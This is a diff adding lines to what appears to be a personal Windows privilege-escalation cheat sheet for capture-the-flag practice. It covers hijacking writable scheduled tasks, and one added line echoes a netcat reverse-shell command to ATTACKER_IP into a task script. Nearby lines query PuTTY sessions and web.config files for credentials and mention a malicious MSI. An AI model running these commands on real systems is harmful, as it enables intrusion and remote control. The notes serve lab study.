@@ -86,6 +86,14 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 ```
 
 * PuTTY `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
+* `schtasks /query /tn vulntask /fo list /v`: look for ones in which we can inject/modify the binary
+* Start task manually `schtasks /run /tn vulntask` (CTF)
+* `icacls c:\tasks\schtask.bat`: check permissions (F=Full Access)
+* (cmd) `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > task.bat`
+* Windows installer files (-f msi -o malicious.msi)
+* Windows services are managed by the Service Control Manager (SCM).
+* `sc qc` (ahah, my steel moutain)
+* IN A EFFING CMD BITCH
 
 <hr>
 
